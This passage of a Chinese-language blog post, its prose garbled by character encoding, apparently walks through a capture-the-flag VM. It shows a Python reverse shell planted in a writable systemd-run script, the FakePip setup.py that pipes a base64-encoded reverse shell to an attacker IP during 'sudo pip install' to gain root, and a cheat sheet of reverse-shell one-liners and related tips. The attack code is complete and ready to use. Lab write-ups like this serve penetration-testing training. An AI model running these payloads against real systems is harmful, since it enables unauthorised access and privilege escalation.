Â∞±‰∏ÄË°åÔºåÂíåtestÊâØ‰∏ä‰∫ÜÂÖ≥Á≥ªÔºåÂæÄ‰πãÂâç/tmp/ÁõÆÂΩï‰∏ãÁöÑtestÊñá‰ª∂ÂÜôÂÖ•‚Äòtest‚ÄôÂ≠óÁ¨¶‰∏≤„ÄÇËøô‰∏™pythonËÑöÊú¨ÊòØÂèØÂÜôÁöÑÔºåÊàëËÉΩÂ∞ÜshellÂÜôÂÖ•ÂÖ∂‰∏≠Âπ∂‰∏îËøêË°åÔºå‰ΩÜÊòØÂèçÂºπÁöÑÁî®Êà∑Âç¥‰ªçÁÑ∂ÊòØmamadouÔºåËÄå‰∏çÊòØÊÉ≥Ë¶ÅÁöÑdevopsÔºåÈóÆÈ¢òÂú®Âì™Âë¢ÔºüÊÄùËÄÉÂæà‰πÖÔºåÊü•‰∫Ü‰∏ãantivirusÁöÑÊÑèÊÄù‚ÄôÊäóÁîüÁ¥†‚ÄôÔºåÊ≤°Âï•Áî®„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.antivirus.py--payload</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.1.107'</span><span class="token punctuation">,</span><span class="token number">7777</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'/bin/bash'</span><span class="token punctuation">,</span><span class="token string">'-i'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>‚Äã    ÂêéÊù•Áªè‰∫∫ÁÇπÊã®ÔºåÊÅçÁÑ∂Â§ßÊÇüÔºåÂ¶ÇÊûúËøô‰∏™ËÑöÊú¨ÊòØ‰ºöËá™Âä®ËøêË°åÁöÑÔºåÈÇ£‰πàÂ∞±‰∏ç‰ºöÂèçÂºπmamadouÊùÉÈôêÁöÑshell‰∫ÜÔºåËÄåÊòØÂÆÉÊú¨Ë∫´ÂÖ∑ÊúâÁöÑdevopsÊùÉÈôêÔºåËÄåÁªèËøáÊü•ËØ¢ËµÑÊñôÔºå‰∫ÜËß£Âà∞Â≠òÊîæÂú®/srcÁõÆÂΩï‰∏ãÁöÑ‰∏ÄËà¨‰∏∫Á≥ªÁªüÊúçÂä°Á±ªËÑöÊú¨Êñá‰ª∂ÔºåÈÇ£‰πàÂÆÉËá™Âä®ËøêË°åÁöÑÂÅáËÆæÂ∞±ÊòæÁÑ∂ÂèØ‰ª•ÊàêÁ´ã‰∫ÜÔºàÊàëËøòÊòØÂØπÊúâ‰∫õÊÄßË¥®‰∏çÂ§ü‰∫ÜËß£Ôºâ„ÄÇ</p><pre><code>#Áî®Ê≠§ÂëΩ‰ª§Êü•Áúã.antivirus.pyÊòØÂê¶Ëá™Âä®ËøêË°åmamadou@Wakanda1:/srv$ grep -R .antivirus.py / 2&gt;/dev/null/lib/systemd/system/antivirus.service:ExecStart=/usr/bin/env python /srv/.antivirus.py#Á°ÆÂÆûÂú®Ëá™Âä®ËøêË°åÔºåÊü•Áúã‰∏Ä‰∏ãantivirus.serviceÊñá‰ª∂[Unit]Description=AntivirusAfter=network.targetStartLimitIntervalSec=0[Service]Type=simpleRestart=alwaysRestartSec=300User=devopsExecStart=/usr/bin/env python /srv/.antivirus.py[Install]WantedBy=multi-user.target#ÂèØ‰ª•ÁúãÂà∞ÊòØÊØè300ÁßíÊâßË°å‰∏ÄÊ¨°</code></pre><p>‚Äã    ÈÇ£‰πàÊé•‰∏ãÊù•ÔºåÂÜôÂÖ•ÁöÑshellÂéüÂ∞Å‰∏çÂä®ÔºåkaliÊîªÂáªÊú∫ncÁõëÂê¨7777Á´ØÂè£ÔºåÁ≠âÂæÖ.antivirus.pyËá™Âä®ËøêË°å(‰∏ÄÂàÜ‰∏ÄÁßíÂú∞Á≠âÂæÖÊÄªÊòØÊº´ÈïøÁöÑÔºâ„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f341619f.png" class="lazyload"></p><p>‚Äã    Êûú‰∏çÂÖ∂ÁÑ∂ÔºåËé∑Âæó‰∫ÜÂèçÂºπdevopsÊùÉÈôêÁöÑshellÔºåÈÇ£‰πàcat flag2.txt ==&gt;Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</p><p>‚Äã    ÈÇ£‰πà‰∏ã‰∏ÄÊ≠•Â∞±ÊòØÊãø‰∏ãrootÊùÉÈôêÔºåÊîªÂÖ•rootÁõÆÂΩï‰∫Ü„ÄÇ</p><hr><h3 id="3-ÊîªÁ†¥root"><a href="#3-ÊîªÁ†¥root" class="headerlink" title="3.ÊîªÁ†¥root"></a>3.ÊîªÁ†¥root</h3><p>‚Äã    ÂÖàÁúãÁúãdevopsÁî®Êà∑ÊùÉÈôêÂ§ßÊ¶ÇÊòØÊÄéÊ†∑ÁöÑ, ÊâßË°åsudo -lÂëΩ‰ª§Ôºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f44d2154.png" class="lazyload"></p><p>‚Äã    ÁÑ∂ËÄåÔºåÂè™Êúâ‰∏Ä‰∏™pipÂëΩ‰ª§ÊòØÂèØ‰ª•‰∏çÈúÄË¶ÅrootÊùÉÈôêÂ∞±ËÉΩÊâßË°åÁöÑÔºåËØïËØïpip install falskÔºåÊ≤°ÈóÆÈ¢ò„ÄÇ</p><p>‚Äã    ÈÇ£‰πàÊÄéÊ†∑ÊâçËÉΩÈÄöËøápipÊù•Ëé∑ÂèñrootÊùÉÈôêÂë¢ÔºüËøôÈáåÁî®Âà∞‰∏Ä‰∏™github‰∏äÁöÑÂºÄÊ∫êËÑöÊú¨Fakepip„ÄÇËøô‰∏™ËÑöÊú¨ÈÄöËøáÂú®pipÈáçÊñ∞ÂÆâË£ÖÊó∂ÊâßË°åÁöÑsetup.pyÊñá‰ª∂‰∏≠ÊèíÂÖ•shellcodeÔºåÂØºËá¥ÂÖ∂ÂèØÈÄöËøápipÂèçÂºπrootÊùÉÈôêÁöÑshellÁªôÊîªÂáªÊú∫„ÄÇÈ°πÁõÆÂú∞ÂùÄ(<a href="https://github.com/0x00-0x00/FakePip.git" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip.git</a>)</p><p>‚Äã    Êé•‰∏ãÊù•Âú®ÊîªÂáªÊú∫‰∏äÊääFakepipÁªôgit‰∏ãÊù•,ÁÑ∂ÂêéËøõÂÖ•FakepipÁõÆÂΩï,Â∞Üsetup.py‰∏≠ÁöÑRHOSTÂèÇÊï∞Êîπ‰∏∫ÊîªÂáªÊú∫Âú∞ÂùÄ:192.168.1.107,ÁÑ∂ÂêéÂêØÂä®pythonÁöÑÁÆÄÊòìÊúçÂä°Âô®„ÄÇ</p><pre><code>from setuptools import setupfrom setuptools.command.install import installimport base64import osclass CustomInstall(install):  def run(self):    install.run(self)    RHOST = &#39;192.168.1.107&#39;  # change this    reverse_shell = &#39;python -c &quot;import os; import pty; import socket; lhost = \&#39;%s\&#39;; lport = 443; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\&#39;HISTFILE\&#39;, \&#39;/dev/null\&#39;); pty.spawn(\&#39;/bin/bash\&#39;); s.close();&quot;&#39; % RHOST    encoded = base64.b64encode(reverse_shell)    os.system(&#39;echo %s|base64 -d|bash&#39; % encoded)setup(name=&#39;FakePip&#39;,      version=&#39;0.0.1&#39;,      description=&#39;This will exploit a sudoer able to /usr/bin/pip install *&#39;,      url=&#39;https://github.com/0x00-0x00/fakepip&#39;,      author=&#39;zc00l&#39;,      author_email=&#39;andre.marques@esecurity.com.br&#39;,      license=&#39;MIT&#39;,      zip_safe=False,      cmdclass={&#39;install&#39;: CustomInstall})</code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f5460351.png" class="lazyload"></p><p>‚Äã    ÁÑ∂ÂêéÂú®devopsÈù∂Êú∫‰∏äÁî®<code>wget http://192.168.1.107/setup.py</code> Â∞ÜÊîªÂáªÊú∫‰∏äÁöÑsetup.py‰∏ãËΩΩÂà∞Êú¨Âú∞ÔºåÊîªÂáªÊú∫kaliÂºÄÂßãÁî®ncÁõëÂê¨443Á´ØÂè£ÔºåÂáÜÂ§áÊé•Êî∂Âç≥Â∞ÜÂà∞Êù•ÁöÑshell„ÄÇ</p><p>‚Äã    Âú®devopsÈù∂Êú∫‰∏äÂëΩ‰ª§pipÈáçË£ÖÔºö<code>sudo pip install ./ --upgrade --force-install</code></p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f60ece0f.png" class="lazyload"></p><p>‚Äã    kaliÂÖ¥Â•ãÂú∞‰∏ÄÊääÊé•Âà∞ÂèçÂºπËøáÊù•ÁöÑshellÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f65ea5ee.png" class="lazyload"></p><p><code>cd root</code> ,ÁÑ∂Âêé<code>cat root.txt</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f7108f3e.png" class="lazyload"></p><p>‚Äã    ËêåÊñ∞ÁöÑÊ∏óÈÄèÂà∞Ê≠§ÊöÇÂÅúemmmm„ÄÇ</p><hr><h2 id="0x01-Â∞èÁü•ËØÜ"><a href="#0x01-Â∞èÁü•ËØÜ" class="headerlink" title="0x01 Â∞èÁü•ËØÜ"></a>0x01 Â∞èÁü•ËØÜ</h2><hr><h3 id="nmap-plus"><a href="#nmap-plus" class="headerlink" title="nmap plus"></a>nmap plus</h3><p>1.ÁâπÊÆäÊâ´ÊèèÊñπÂºè ==&gt; nmap -sV/-sP/-sS/sL  ÂÖ∂‰∏≠-sPÊòØÁî®‰∫éÊâ´ÊèèIPÊÆµÁöÑ</p><p>2.ËØ¶ÁªÜÂú∞Êâ´ÊèèÁõÆÊ†áÔºö</p><p>nmap -sV ÊàñËÄÖ nmap -p- -A  &lt;ÁõÆÊ†áip&gt;</p><p>ÊàñËÄÖË∂ÖÂº∫ÂäõÁöÑÔºö nmap -sS -sV  -A  -p- &lt;ÁõÆÊ†áip&gt;</p><hr><h3 id="python-ÂèçÂºπshell-amp-pip-get-shell"><a href="#python-ÂèçÂºπshell-amp-pip-get-shell" class="headerlink" title="python ÂèçÂºπshell &amp; pip get shell"></a>python ÂèçÂºπshell &amp; pip get shell</h3><p>python ÂèçÂºπ shell:</p><pre class=" language-bash"><code class="language-bash">python -c <span class="token string">"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</span>192.168.1.107<span class="token string">",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="token string">","</span>-i<span class="token string">"]);"</span></code></pre><p>pythonÊûÑÈÄ†ÂÆåÂÖ®‰∫§‰∫íÂºèÁªàÁ´Ø :</p><pre class=" language-bash"><code class="language-bash"> python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span></code></pre><hr><h3 id="php-filter-and-input-‚ÄìLFIÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û"><a href="#php-filter-and-input-‚ÄìLFIÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û" class="headerlink" title="php filter and input ‚ÄìLFIÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û"></a>php filter and input ‚ÄìLFIÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û</h3><p>ÂèÇËÄÉ <a href="https://blog.csdn.net/qq_35544379/article/details/78230629" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629</a></p><p>php://filter,php://input,php://outputÈÉΩÊòØÊúâÂ¶ôÁî®ÁöÑÂì¶ÔºÅ</p><hr><h3 id="msfvenom-p-ÁîüÊàêshell"><a href="#msfvenom-p-ÁîüÊàêshell" class="headerlink" title="msfvenom -p   ÁîüÊàêshell"></a>msfvenom -p   ÁîüÊàêshell</h3><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/06/5bb89f84ea8cc.png" class="lazyload"></p><p>‚Äã    ‰ΩÜÂú®Ê∏óÈÄèËøáÁ®ã‰∏≠ÂèëÁé∞Ôºå‰∏çÁî®msfvenomÁîüÊàêÁöÑÂä†ÂØÜshell‰πüËÉΩÊàêÂäüÂèçÂºπÔºå‰∏çËøáËøòÊòØË¶ÅÂÖªÊàêÂ•Ω‰π†ÊÉØÔºåÂ§öÁî®Áî®ËøôÁßçÁ•ûÂô®ÊèêÈ´òÊïàÁéáÂπ∂‰∏îÂáÜÁ°ÆÁéá„ÄÇ</p><p>ÂèÇËÄÉÈìæÊé• <a href="https://www.cnblogs.com/xishaonian/p/6851475.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6851475.html</a></p><hr><h3 id="linux-‰∏≠ÁöÑ‰∏Ä‰∫õÂëΩ‰ª§‰∏éÁâπÊÄß"><a href="#linux-‰∏≠ÁöÑ‰∏Ä‰∫õÂëΩ‰ª§‰∏éÁâπÊÄß" class="headerlink" title="linux ‰∏≠ÁöÑ‰∏Ä‰∫õÂëΩ‰ª§‰∏éÁâπÊÄß"></a>linux ‰∏≠ÁöÑ‰∏Ä‰∫õÂëΩ‰ª§‰∏éÁâπÊÄß</h3><p>==&gt; su &amp; sudo </p><p>ÂèØÁî®‰∫éÂàáÊç¢Áî®Êà∑</p><p>==&gt; lsattr ÊòØ lsÁöÑÂçáÁ∫ßÁâàÔºåÂ∞±Â¶Çaptitude ‰∏éaptÁõ∏‰ºº‰∏ÄÊ†∑</p><p>==&gt; find / -user root 2&gt;/dev/null Êü•ÁúãÁî®Êà∑Â±ûÊÄß‰∏∫rootÁöÑÊñá‰ª∂</p><p>==&gt;ps -aux Êü•ÁúãÊâÄÊúâÊúçÂä°  ==&gt;top Êü•ÁúãËøõÁ®ã</p><hr><h2 id="0x02-ÊÄªÁªì"><a href="#0x02-ÊÄªÁªì" class="headerlink" title="0x02 ÊÄªÁªì"></a>0x02 ÊÄªÁªì</h2><p>‚Äã    Ê∏óÈÄè‰∏ÄÂÆö‰∏ÄÂÆöÊ≥®ÊÑè‰ø°ÊÅØÊî∂ÈõÜÔºåÊÄùÁª¥ÊãìÂ±ïÔºåÁÑ∂ÂêéÂ∞±ÊòØÊâéÂÆûÁöÑÂü∫Á°ÄÔºÅ</p><p>‚Äã    Â¶ÇÊûúÊ≤°ÊúâÈÇ£‰πàÂº∫ÁöÑËÉΩÂäõÔºåÊ∏óÈÄèÁ°ÆÂÆûÊúâÁÇπÂêÉÂäõÔºå‰ΩÜÊòØÂêÉÂäõÁöÑËøáÁ®ã‰πüÂú®ËøõÊ≠•ÔºåÂ∞±ÂÉè‰∏çÂÅúÁöÑË¢´ËôêÁöÑËøáÁ®ãÔºåËá™ÁÑ∂Ëá™Â∑±ÁöÑÁ≠âÁ∫ß‰πüÂú®ÊèêÈ´òÔºå‰∏çÂÅúÂú∞ËÜúÂ§ßÁ•ûÁöÑÊñáÁ´†ÁöÑÂêåÊó∂ÔºåËá™Â∑±‰πü‰ºöÂèóÂÖ∂ÂΩ±ÂìçÔºå‰Ωú‰∏∫ËÄÅËÖäËÇâÔºåÂè™ËÉΩÁªßÁª≠Â≠¶‰π†„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Èù∂Êú∫ </tag>
            
            <tag> Ê∏óÈÄè </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
